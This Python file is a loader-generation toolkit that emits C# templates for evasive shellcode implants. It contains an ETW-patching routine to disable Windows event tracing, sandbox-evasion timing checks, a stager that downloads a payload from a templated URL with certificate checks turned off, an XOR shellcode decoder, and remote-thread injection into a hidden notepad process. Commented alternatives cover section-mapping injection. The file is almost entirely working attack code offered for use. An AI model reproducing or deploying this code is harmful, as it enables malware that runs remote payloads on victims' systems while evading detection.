import base64
import subprocess

DLL_IMPORT = {
  "VirtualAlloc": "",
  "CreateThread": "",
  "WaitForSingleObject": "",
  "NtCreateSection":"",
  "NtMapViewOfSection":"",

}
ETW_FUNCS = """
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);

[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

private static byte[] getETWPayload()
    {
        if (!is64Bit())
            return Convert.FromBase64String("whQA");
        return Convert.FromBase64String("ww==");
    }
private static void PatchEtw(byte[] patch)
    {
        try
        {
            uint oldProtect;

            var ntdll = LoadLibrary("ntdll.dll");
            var etwEventSend =   GetProcAddress(ntdll, "EtwEventWrite");

            VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, etwEventSend, patch.Length);
        }
        catch
        {
            Console.WriteLine("Error unhooking ETW");
        }
    }
"""

ARCH_DETECTION = """
        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }
"""

HEURISTICS_IMPORT = """
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

"""

HEURISTICS_CODE = """
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds; if(t2 < 1.5)
    { return; }

    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
    if (mem == null)
    { return; }
"""

URL_DL_CODE = """
	string url = "{STAGER_URL}";

       if (!is64Bit())
	    url = "{STAGER_URL}32";

	ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
	System.Net.WebClient client = new System.Net.WebClient();
	byte[] buf = client.DownloadData(url);

"""

SC_XOR_DECODER = """
  byte[] buf = new byte[] {{ {xor_shellcode} }};
  for (int i = 0; i < buf.Length; i++)
  {{
    buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
  }}
"""

ETW_PATCH = "PatchEtw(getETWPayload());"


START_PROCESS_INJECT_IMPORT = """
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

"""

START_PROCESS_INJECT = """
          ProcessStartInfo start = new ProcessStartInfo();
          start.Arguments = ""; 
          start.FileName = "notepad.exe";
          start.WindowStyle = ProcessWindowStyle.Hidden;
          start.CreateNoWindow = true;
          int exitCode;
          // Run the external process & wait for it to finish
          using (Process proc = Process.Start(start))
          {{
            Process[] expProc = Process.GetProcessesByName("notepad");
            for (int i = 0; i < expProc.Length; i++) {{
              IntPtr hProcess = OpenProcess(0x001F0FFF, false, expProc[i].Id);
              IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
              IntPtr outSize;
              WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
              IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }}
               proc.WaitForExit();
               // Retrieve the app's exit code
               exitCode = proc.ExitCode;
          }}
"""

### OTHER IMPORTS
## The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.

#        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
#        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
#
#        [DllImport("kernel32.dll")]
#        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
#
#        [DllImport("kernel32.dll")]
#        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

#        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
#        static extern UInt32 NtCreateSection(
#            ref IntPtr SectionHandle,
#            UInt32 DesiredAccess,
#            IntPtr ObjectAttributes,
#            ref UInt32 MaximumSize,
#            UInt32 SectionPageProtection,
#            UInt32 AllocationAttributes,
#            IntPtr FileHandle);
#
#        [DllImport("ntdll.dll", SetLastError=true)]
#        static extern uint NtMapViewOfSection(
#            IntPtr SectionHandle,
#            IntPtr ProcessHandle,
#            ref IntPtr BaseAddress,
#            UIntPtr ZeroBits,
#            UIntPtr CommitSize,
#            out ulong SectionOffset,
#            out uint ViewSize,
#            uint InheritDisposition,
#            uint AllocationType,
#            uint Win32Protect);
#
#        [DllImport("ntdll.dll", SetLastError=true)]
#        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
#
#        [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
#        static extern int NtClose(IntPtr hObject);


class Obfuscator:
  def __init__(self, string, xor_key=b'\00'):
    self.raw = string
    self.key = xor_key
    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_bytes(self):
    return bytes(self.encoded)

  def get_b64(self):
    return base64.b64encode(bytes(self.encoded))

  def get_hex_c(self):
    return ",".join("\\x%02x" % b for b in self.encoded)

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_hex_vba(self):
    return ",".join("%02d" % b for b in self.encoded)

  def get_key_csharp(self):
    return "".join("0x%02x" % b for b in self.key)


class ShellCode(Obfuscator):
  def __init__(self, msf_cmd, xor_key=b'\00', caesar_key=0):
    self.raw = subprocess.check_output(msf_cmd, shell=True)
    self.key = xor_key
    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

class Implant:
  def __init__(self, template, base_name):
    self.template = template
    self.base_name = base_name


  def compile(self):
    pass


# Other injection types
#          //  IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
#          //  Marshal.Copy(buf, 0, addr, buf.Length);
#          //  IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
#          //  WaitForSingleObject(hThread, 0xFFFFFFFF);
#
#
#          //SIZE_T size = 4096;
#          //LARGE_INTEGER sectionSize = {{ size }};
#          //HANDLE sectionHandle = NULL;
#          //PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
#          //
#          //// create a memory section
#          //NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
#          //
#          //// create a view of the memory section in the local process
#          //NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
#
#          //// create a view of the memory section in the target process
#          //HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 1480);
#          //NtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
#
#          //// copy shellcode to the local view, which will get reflected in the target process's mapped view
#          //memcpy(localSectionAddress, buf, sizeof(buf));
#          //
#          //HANDLE targetThreadHandle = NULL;
#          //RtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
